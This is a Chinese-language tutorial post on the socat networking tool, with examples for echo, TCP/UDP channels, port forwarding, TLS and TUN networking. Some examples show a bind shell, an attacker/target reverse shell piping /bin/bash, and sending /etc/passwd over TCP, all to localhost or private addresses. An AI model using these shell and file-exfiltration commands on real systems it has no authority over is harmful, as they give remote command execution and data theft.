

> **事以密成，语以泄败。**




---


### 导航


* [介绍](https://github.com)
* [基本语法](https://github.com)
* [用法示例](https://github.com)
	+ [回显输入](https://github.com)
	+ [回显输入 over TCP/UDP](https://github.com)
	+ [正向连接 shell](https://github.com)
	+ [反向连接 shell](https://github.com)
	+ [端口转发](https://github.com)
	+ [网络服务](https://github.com):[veee加速器](https://youhaochi.com)
	+ [文件传输](https://github.com)
	+ [管道传输](https://github.com)
	+ [加密传输](https://github.com)
	+ [TUN 网络](https://github.com)
* [杂项](https://github.com)




---


### 介绍


**Socat** 是一个功能强大的网络工具（相当于是增强版 netcat），它可以在两个数据流之间建立通道，且支持的数据流类型非常丰富，例如：TCP、UDP、TUN、SOCKS 代理、UNIX 套接字、STDIO 标准输入输出流、PIPE 管道流、OPEN 文件流、EXEC/SHELL/SYSTEM 进程流、OPENSSl 加密流等。




---


### 基本语法



```
socat [OPTION] [,OPTS] [,OPTS]

```

* **ADDRESS\_1** 和 **ADDRESS\_2** 表示两个通信的端点，即数据流。
* **OPTION** 用于设置全局选项，比如单向模式、调试模式、日志级别等。【注：单向模式中的 \-u 表示左流向右，\-U 表示右流向左，不加则表示双向模式。】
* **OPTS** 用于设置数据流的选项（不同类型的数据流对应的选项亦有所区别），常用的选项是 fork、reuseaddr。




---


### 用法示例


#### 1\. 回显输入



```
socat - -	#STDIO STDIO

```

说明：在终端输入什么就输出什么。


![image](https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191318122-201307770.png)


#### 2\. 回显输入 over TCP/UDP



```
socat - tcp-listen:1234,fork 	#STDIO TCP	服务端监听1234端口
socat - tcp:127.0.0.1:1234		#STDIO TCP	客户端连接1234端口

socat - udp4-listen:1234,bind=192.168.56.20,fork	#STDIO UDP	服务端仅监听192.168.56.20接口的1234端口
socat - udp4:192.168.56.20:1234						#STDIO UDP	客户端连接1234端口

```

说明：客户端将输入的数据通过 tcp/udp 通道传输给服务端，而服务端又将接收的数据再传输给标准输出。


![image](https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191344357-928788121.png)


![image](https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191350650-1350264462.png)


#### 3\. 正向连接 shell



```
socat tcp-listen:1234,fork exec:/bin/bash	#TCP EXEC	服务端监听1234端口
socat - tcp:127.0.0.1:1234					#STDIO TCP	客户端连接1234端口

```

说明：服务端将接收到的数据传输给 bash 进程，bash 处理之后将结果返回给客户端的标准输出。,


![image](https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191507543-870662294.png)


#### 4\. 反向连接 shell



```
socat - tcp-listen:1234,fork				#STDIO TCP	攻击机监听1234端口
socat EXEC:/bin/bash tcp:127.0.0.1:1234		#EXEC TCP	靶机连接1234端口
#socat - tcp:127.0.0.1:1234					#STDIO TCP	靶机连接1234端口

```

说明：攻击机将输入的数据传输给连接它的靶机，而靶机又将数据传递给了 bash 进程，经其处理之后返回结果到攻击机。【注意：如果有多个靶机同时连接攻击机，那么攻击机的输入会随机被传递给其中一个靶机，而不是同时传递给所有靶机。】


![image](https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191522601-194623181.png)


#### 5\. 端口转发



```
socat tcp-listen:1234,fork tcp:127.0.0.1:8080	#TCP TCP

```

说明：将本地监听端口 tcp/1234 接收的数据转发到本地的 tcp/8080 端口。【转发到远端亦行】


![image](https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191538690-450780523.png)


#### 6\. 网络服务



```
socat -U tcp-listen:1234,fork open:test.txt		#TCP OPEN

```

说明：将文件内容作为服务响应返回。【注意：此时最好使用\-U单向模式(右向左)，否则请求可能会覆盖文件内容。】


![image](https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191552454-227255581.png)


#### 7\. 文件传输



```
socat -U tcp-listen:1234,fork open:/etc/passwd				#TCP OPEN	发送端
socat -u tcp:127.0.0.1:1234 open:./passwd.txt,create		#TCP OPEN	接收端

```

说明：发送端将文件数据传输给连接到监听端口的接收端，接收端又将收到的数据打包到新文件中。【注意单向模式的使用】


![image](https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191602046-1873155771.png)


#### 8\. 管道传输



```
echo ok | socat - tcp-listen:1234,fork	#PIPE TCP
#socat - tcp-listen:1234,fork | bash	#TCP PIPE

```

说明：（1）将 echo 输出的数据通过管道传递给连向监听端口的终端；（2）将监听端口接收到的数据传递给 bash 进程处理。


![image](https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191611736-708700483.png)


![image](https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191618610-350648082.png)


#### 9\. 加密传输



```
socat openssl-listen:8443,cert=ssl-cert.pem,key=ssl-cert.key,verify=0,fork tcp:127.0.0.1:8080	#OPENSSL TCP OPENSSL 服务端
#socat - openssl:127.0.0.1:8443,verify=0	#OPENSSL 客户端

#注：当服务端不是转发给 http 服务时，客户端需要此命令配合使用，示例截图中的 curl 命令拥有 openssl 客户端的功能故示例没有用到该命令。
#注：功能测试时，证书的生成可以使用 make-ssl-cert /usr/share/ssl-cert/ssleay.cnf ssl-cert 命令生成。

```

说明：监听 HTTPS 请求并将其转发到本地的 HTTP 服务。


![image](https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191638145-1872039728.png)


#### 10\. TUN 网络



```
socat tcp-listen:1234,fork tun:192.168.1.1/24,up			#TCP TUN	服务端
socat tcp:192.168.56.20:1234 tun:192.168.1.2/24,up			#TCP TUN	客户端

```

说明：所有连接到 TUN 服务端的终端，全都接入了一个自建的 TUN 网络之中，从而实现了异地组网。【在 Linux 中测试是成功的，但是在 Windows 中测试是失败的。】


![image](https://img2024.cnblogs.com/blog/1503193/202412/1503193-20241224191648291-781214960.png)




---


### 杂项


* Socat 官网：[http://www.dest\-unreach.org/socat/](https://github.com)
* Socat for Windows ：[https://github.com/StudioEtrange/socat\-windows](https://github.com)


